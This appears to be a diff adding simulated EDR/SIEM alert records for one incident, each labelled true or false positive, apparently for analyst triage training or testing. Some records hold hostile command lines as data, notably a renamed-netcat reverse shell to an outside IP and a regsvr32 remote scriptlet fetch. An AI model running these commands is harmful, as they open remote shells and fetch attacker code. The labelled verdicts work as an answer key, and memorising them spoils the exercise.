+      "name": "Process: New Service Installation",
+      "description": "New service created on endpoint.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Process: New Service Installation",
+      "summary": "New service created on endpoint.",
+      "status": "new",
+      "confidence": 0.4,
+      "risk_score": 30,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      },
+      "process": {
+        "name": "msiexec.exe",
+        "command_line": "msiexec.exe /i agent_update.msi /qn"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0018",
+      "host_risk": 41,
+      "user_risk": 58,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Legitimate activity, verified with the relevant team."
+  },
+  {
+    "alert_id": "alert-20260705-0019",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T10:44:14Z",
+    "ingested_at": "2026-07-05T10:49:14Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "credential_access",
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Credential Access: Memory Dumping",
+      "description": "Execution of PSUnlock for credential dumping.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1003"
+      ]
+    },
+    "alert": {
+      "title": "Credential Access: Memory Dumping",
+      "summary": "Execution of PSUnlock for credential dumping.",
+      "status": "new",
+      "confidence": 0.98,
+      "risk_score": 98,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "rundll32.exe",
+        "command_line": "rundll32 C:\\ProgramData\\PShdll35.dll,main -f C:\\ProgramData\\doutlook.ps1"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0019",
+      "host_risk": 59,
+      "user_risk": 77,
+      "asset_criticality": "Medium",
+      "attack_stage": "credential-access",
+      "kill_chain_phase": "Exploitation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1003",
+        "name": "OS Credential Dumping"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "file_hash": "ebdd6059da1abd97e03d37ba001bad4aa6bcbabd"
+        }
+      }
+    ],
+    "additional_context": "Rundll32 executing PShdll35.dll to dump Outlook credentials.",
+    "knowledge_base": "Credential Access: Memory Dumping"
+  },
+  {
+    "alert_id": "alert-20260705-0020",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T10:47:29Z",
+    "ingested_at": "2026-07-05T10:52:29Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "lateral_movement",
+        "authentication"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Lateral Movement: Pass the Hash",
+      "description": "Successful authentication using NTLM hash.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1550.002"
+      ]
+    },
+    "alert": {
+      "title": "Lateral Movement: Pass the Hash",
+      "summary": "Successful authentication using NTLM hash.",
+      "status": "new",
+      "confidence": 0.95,
+      "risk_score": 90,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "DC-01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jdoe"
+      },
+      "process": {
+        "name": "lsass.exe"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0020",
+      "host_risk": 54,
+      "user_risk": 71,
+      "asset_criticality": "High",
+      "attack_stage": "lateral-movement",
+      "kill_chain_phase": "Exploitation"
+    },
+    "target": {
+      "hostname": "DC-01"
+    },
+    "network": {
+      "src_ip": "10.10.2.55",
+      "dst_hostname": "DC-01"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1550.002",
+        "name": "Pass the Hash"
+      }
+    },
+    "evidence": [
+      {
+        "type": "windows_event",
+        "data": {
+          "event_id": "4624"
+        }
+      }
+    ],
+    "knowledge_base": "Lateral Movement: Pass the Hash - Verify the authentication attempt with the user or AD expert."
+  },
+  {
+    "alert_id": "alert-20260705-0021",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T10:51:15Z",
+    "ingested_at": "2026-07-05T10:56:15Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "network"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Process: Suspicious Executable Download",
+      "description": "Executable downloaded from internal network share and run.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Process: Suspicious Executable Download",
+      "summary": "Executable downloaded from internal network share and run.",
+      "status": "new",
+      "confidence": 0.3,
+      "risk_score": 20,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-HR2",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      },
+      "process": {
+        "name": "ccmexec.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0021",
+      "host_risk": 80,
+      "user_risk": 81,
+      "asset_criticality": "Medium"
+    },
+    "network": {
+      "src_ip": "10.10.3.45",
+      "dst_ip": "10.10.1.15",
+      "dst_port": 445,
+      "dst_hostname": "SCCM-SRV-01"
+    },
+    "knowledge_base": "Legitimate activity, verified with the relevant team."
+  },
+  {
+    "alert_id": "alert-20260705-0022",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T11:03:19Z",
+    "ingested_at": "2026-07-05T11:08:19Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "lateral_movement",
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Lateral Movement: WMI Execution",
+      "description": "WMI used to copy file to remote machine.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1047"
+      ]
+    },
+    "alert": {
+      "title": "Lateral Movement: WMI Execution",
+      "summary": "WMI used to copy file to remote machine.",
+      "status": "new",
+      "confidence": 0.88,
+      "risk_score": 85,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jdoe"
+      },
+      "process": {
+        "name": "wmic.exe",
+        "command_line": "wmic /node:SRV-FILE01 process call create \"cmd.exe /c copy msfte.dll\""
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0022",
+      "host_risk": 90,
+      "user_risk": 80,
+      "asset_criticality": "Medium",
+      "attack_stage": "lateral-movement",
+      "kill_chain_phase": "Execution"
+    },
+    "target": {
+      "hostname": "SRV-FILE01"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1047",
+        "name": "Windows Management Instrumentation"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "command": "wmic /node:"
+        }
+      }
+    ],
+    "additional_context": "Wmic used to copy msfte.dll to SRV-FILE01.",
+    "knowledge_base": "Lateral Movement: WMI Execution - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0023",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T11:10:30Z",
+    "ingested_at": "2026-07-05T11:15:30Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "network"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Process: Remote Control Software Detected",
+      "description": "Execution of remote desktop sharing application.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Process: Remote Control Software Detected",
+      "summary": "Execution of remote desktop sharing application.",
+      "status": "new",
+      "confidence": 0.6,
+      "risk_score": 40,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-SALES5",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "helpdesk_adm"
+      },
+      "process": {
+        "name": "TeamViewer_Service.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0023",
+      "host_risk": 72,
+      "user_risk": 26,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Legitimate activity, verified with the relevant team."
+  },
+  {
+    "alert_id": "alert-20260705-0024",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T11:20:11Z",
+    "ingested_at": "2026-07-05T11:25:11Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "persistence",
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Persistence: Windows Service Modification",
+      "description": "Wsearch service restarted.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1543.003"
+      ]
+    },
+    "alert": {
+      "title": "Persistence: Windows Service Modification",
+      "summary": "Wsearch service restarted.",
+      "status": "new",
+      "confidence": 0.85,
+      "risk_score": 80,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "SRV-FILE01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jdoe"
+      },
+      "process": {
+        "name": "net.exe",
+        "command_line": "net start wsearch"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0024",
+      "host_risk": 55,
+      "user_risk": 22,
+      "asset_criticality": "Medium",
+      "attack_stage": "persistence",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1543.003",
+        "name": "Windows Service"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "command": "net start wsearch"
+        }
+      }
+    ],
+    "additional_context": "Net stop/start wsearch used to hijack SearchIndexer.exe.",
+    "knowledge_base": "Persistence: Windows Service Modification - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0025",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T11:26:28Z",
+    "ingested_at": "2026-07-05T11:31:28Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Command and Control: Suspicious HTTP",
+      "description": "HTTP traffic matching Cobalt Strike Amazon profile.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.001"
+      ]
+    },
+    "alert": {
+      "title": "Command and Control: Suspicious HTTP",
+      "summary": "HTTP traffic matching Cobalt Strike Amazon profile.",
+      "status": "new",
+      "confidence": 0.9,
+      "risk_score": 85,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      },
+      "process": {
+        "name": "SearchIndexer.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0025",
+      "host_risk": 86,
+      "user_risk": 73,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "network": {
+      "src_ip": "10.10.1.20",
+      "dst_ip": "110.10.179.65",
+      "dst_port": 80,
+      "dst_hostname": "110.10.179.65"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_traffic",
+        "data": {
+          "pattern": "Amazon Profile"
+        }
+      }
+    ],
+    "additional_context": "Traffic to 110.10.179.65 matches Amazon Malleable C2 profile.",
+    "knowledge_base": "Command and Control: Suspicious HTTP"
+  },
+  {
+    "alert_id": "alert-20260705-0026",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T11:39:42Z",
+    "ingested_at": "2026-07-05T11:44:42Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "authentication",
+        "network"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Authentication: Remote Desktop Connection",
+      "description": "Administrator logged in via RDP.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Authentication: Remote Desktop Connection",
+      "summary": "Administrator logged in via RDP.",
+      "status": "new",
+      "confidence": 0.4,
+      "risk_score": 25,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "SRV-FILE01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jdoe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0026",
+      "host_risk": 20,
+      "user_risk": 88,
+      "asset_criticality": "Medium"
+    },
+    "target": {
+      "hostname": "SRV-FILE01"
+    },
+    "network": {
+      "src_ip": "10.10.1.5",
+      "dst_port": 3389
+    },
+    "knowledge_base": "Expected user activity, verified with the user."
+  },
+  {
+    "alert_id": "alert-20260705-0027",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T11:54:14Z",
+    "ingested_at": "2026-07-05T11:59:14Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "persistence",
+        "registry"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Persistence: Outlook Macro Backdoor",
+      "description": "Registry modified to load Outlook macro.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1137.001"
+      ]
+    },
+    "alert": {
+      "title": "Persistence: Outlook Macro Backdoor",
+      "summary": "Registry modified to load Outlook macro.",
+      "status": "new",
+      "confidence": 0.95,
+      "risk_score": 95,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "SRV-FILE01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jdoe"
+      },
+      "process": {
+        "name": "reg.exe",
+        "command_line": "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14\\Outlook /v LoadMacroProviderOnBoot"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0027",
+      "host_risk": 24,
+      "user_risk": 70,
+      "asset_criticality": "Medium",
+      "attack_stage": "persistence",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1137.001",
+        "name": "Office Template Macros"
+      }
+    },
+    "evidence": [
+      {
+        "type": "registry_event",
+        "data": {
+          "key": "LoadMacroProviderOnBoot"
+        }
+      }
+    ],
+    "knowledge_base": "Persistence: Outlook Macro Backdoor - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0028",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T11:57:38Z",
+    "ingested_at": "2026-07-05T12:02:38Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: High Volume DC Communication",
+      "description": "High RPC traffic between Domain Controllers.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Network: High Volume DC Communication",
+      "summary": "High RPC traffic between Domain Controllers.",
+      "status": "new",
+      "confidence": 0.5,
+      "risk_score": 30,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-INTERNAL",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0028",
+      "host_risk": 25,
+      "user_risk": 26,
+      "asset_criticality": "Medium"
+    },
+    "target": {
+      "hostname": "DC-02"
+    },
+    "network": {
+      "src_ip": "10.10.1.10",
+      "dst_ip": "10.10.1.11",
+      "dst_port": 135,
+      "dst_hostname": "DC-02"
+    },
+    "knowledge_base": "Legitimate activity, verified with the relevant team."
+  },
+  {
+    "alert_id": "alert-20260705-0029",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T12:12:02Z",
+    "ingested_at": "2026-07-05T12:17:02Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "c2",
+        "execution"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Command and Control: Outlook Macro",
+      "description": "Outlook executing cmd.exe.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1059.003"
+      ]
+    },
+    "alert": {
+      "title": "Command and Control: Outlook Macro",
+      "summary": "Outlook executing cmd.exe.",
+      "status": "new",
+      "confidence": 0.98,
+      "risk_score": 98,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "SRV-FILE01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jdoe"
+      },
+      "process": {
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /C ipconfig > %temp%.log.txt"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0029",
+      "host_risk": 61,
+      "user_risk": 41,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1059.003",
+        "name": "Windows Command Shell"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "parent": "outlook.exe"
+        }
+      }
+    ],
+    "additional_context": "Outlook.exe spawning cmd.exe for C2.",
+    "knowledge_base": "Command and Control: Outlook Macro - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0030",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T12:26:21Z",
+    "ingested_at": "2026-07-05T12:31:21Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "exfiltration",
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Exfiltration: Sensitive Data Staging",
+      "description": "Sensitive document staged via Outlook.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1074.001"
+      ]
+    },
+    "alert": {
+      "title": "Exfiltration: Sensitive Data Staging",
+      "summary": "Sensitive document staged via Outlook.",
+      "status": "new",
+      "confidence": 0.95,
+      "risk_score": 95,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "SRV-FILE01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jdoe"
+      },
+      "process": {
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /C c:\\Users\\admin_jdoe\\Desktop\\Financial_Q3.xls %temp%"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0030",
+      "host_risk": 42,
+      "user_risk": 88,
+      "asset_criticality": "Medium",
+      "attack_stage": "exfiltration",
+      "kill_chain_phase": "Actions on Objectives"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1074.001",
+        "name": "Local Data Staging"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "command": "copy .xls"
+        }
+      }
+    ],
+    "knowledge_base": "Exfiltration: Sensitive Data Staging - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0031",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T12:33:41Z",
+    "ingested_at": "2026-07-05T12:38:41Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "c2",
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Command and Control: Custom Netcat",
+      "description": "Execution of renamed netcat.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1095"
+      ]
+    },
+    "alert": {
+      "title": "Command and Control: Custom Netcat",
+      "summary": "Execution of renamed netcat.",
+      "status": "new",
+      "confidence": 0.9,
+      "risk_score": 90,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "SRV-FILE01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jdoe"
+      },
+      "process": {
+        "name": "kb-10233.exe",
+        "command_line": "kb-10233.exe -e cmd.exe 45.114.117.137 443"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0031",
+      "host_risk": 72,
+      "user_risk": 71,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1095",
+        "name": "Non-Application Layer Protocol"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "file_hash": "c5e19c02a9a1362c67ea87c1e049ce9056425788"
+        }
+      }
+    ],
+    "additional_context": "kb-10233.exe identified as custom netcat.",
+    "knowledge_base": "Command and Control: Custom Netcat"
+  },
+  {
+    "alert_id": "alert-20260705-0032",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T12:41:43Z",
+    "ingested_at": "2026-07-05T12:46:43Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "persistence",
+        "defense_evasion"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Persistence: DLL Hijacking",
+      "description": "GoogleUpdate.exe loading malicious goopdate.dll.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1574.002"
+      ]
+    },
+    "alert": {
+      "title": "Persistence: DLL Hijacking",
+      "summary": "GoogleUpdate.exe loading malicious goopdate.dll.",
+      "status": "new",
+      "confidence": 0.96,
+      "risk_score": 95,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      },
+      "process": {
+        "name": "GoogleUpdate.exe"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0032",
+      "host_risk": 49,
+      "user_risk": 73,
+      "asset_criticality": "Medium",
+      "attack_stage": "persistence",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1574.002",
+        "name": "DLL Side-Loading"
+      }
+    },
+    "evidence": [
+      {
+        "type": "module_load",
+        "data": {
+          "dll": "goopdate.dll"
+        }
+      }
+    ],
+    "additional_context": "Fake goopdate.dll loaded by GoogleUpdate.exe.",
+    "knowledge_base": "Persistence: DLL Hijacking - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0033",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T12:57:30Z",
+    "ingested_at": "2026-07-05T13:02:30Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "defense_evasion",
+        "execution"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Defense Evasion: Regsvr32 execution",
+      "description": "Regsvr32 downloading COM scriptlet.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1218.010"
+      ]
+    },
+    "alert": {
+      "title": "Defense Evasion: Regsvr32 execution",
+      "summary": "Regsvr32 downloading COM scriptlet.",
+      "status": "new",
+      "confidence": 0.95,
+      "risk_score": 95,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "regsvr32.exe",
+        "command_line": "regsvr32 /s /n /u /i:http://support.chatconnecting.com:80/pic.png scrobj.dll"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0033",
+      "host_risk": 49,
+      "user_risk": 66,
+      "asset_criticality": "Medium",
+      "attack_stage": "defense-evasion",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1218.010",
+        "name": "System Binary Proxy Execution: Regsvr32"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "command": "regsvr32 scrobj.dll"
+        }
+      }
+    ],
+    "additional_context": "regsvr32 executing payload from support.chatconnecting.com.",
+    "knowledge_base": "Defense Evasion: Regsvr32 execution - Verify the process execution and command line arguments with the System Administrator."
+  }
+]
